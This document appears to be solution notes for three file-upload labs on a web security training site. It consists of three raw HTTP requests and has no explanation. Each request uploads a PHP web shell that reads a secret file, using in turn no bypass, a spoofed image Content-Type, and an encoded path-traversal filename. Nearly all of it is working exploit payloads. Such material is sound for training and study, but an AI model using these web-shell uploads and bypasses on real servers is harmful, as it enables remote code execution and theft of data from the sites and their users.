## 1. Remote code execution via web shell upload

```
POST /my-account/avatar HTTP/2
Host: 0a2a000d034b3a5780be90c6006100a4.web-security-academy.net
Cookie: session=c1kKE6VfKOuRSYXfIiWblDekcr94Gk5P
Content-Length: 460
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a2a000d034b3a5780be90c6006100a4.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo9RcZN4QtSz1lVuV
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2a000d034b3a5780be90c6006100a4.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryo9RcZN4QtSz1lVuV
Content-Disposition: form-data; name="avatar"; filename="logo_3.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryo9RcZN4QtSz1lVuV
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryo9RcZN4QtSz1lVuV
Content-Disposition: form-data; name="csrf"

uvi1ibBncQEdfVL9iTXMpumRd3FvOzQG
------WebKitFormBoundaryo9RcZN4QtSz1lVuV--

```

## 2. Web shell upload via Content-Type restriction bypass

```
POST /my-account/avatar HTTP/2
Host: 0a6f0062033d0d4f86d8eb3a00490099.web-security-academy.net
Cookie: session=wVCKjRXlPHAkbLGmnE6sjc1oFktH9oZD
Content-Length: 460
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6f0062033d0d4f86d8eb3a00490099.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN53t54EuqbwspDuF
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6f0062033d0d4f86d8eb3a00490099.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryN53t54EuqbwspDuF
Content-Disposition: form-data; name="avatar"; filename="logo_3.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryN53t54EuqbwspDuF
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryN53t54EuqbwspDuF
Content-Disposition: form-data; name="csrf"

4QXDTZZ964IE2wNFCwZgCr75vpW9dV8W
------WebKitFormBoundaryN53t54EuqbwspDuF--

```


## 3. Web shell upload via path traversal

```
POST /my-account/avatar HTTP/2
Host: 0afb005b041e73d9850c598400660029.web-security-academy.net
Cookie: session=EXsiPZjf5YbJOdRKjuD0Q4btCnUdalpv
Content-Length: 461
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0afb005b041e73d9850c598400660029.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYjviDTGKjZnr01JZ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afb005b041e73d9850c598400660029.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryYjviDTGKjZnr01JZ
Content-Disposition: form-data; name="avatar"; filename="..%2ffb.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryYjviDTGKjZnr01JZ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryYjviDTGKjZnr01JZ
Content-Disposition: form-data; name="csrf"

6RUIJpx53yU4xZPI7hgv2ysV7z7pG2ZO
------WebKitFormBoundaryYjviDTGKjZnr01JZ--

```

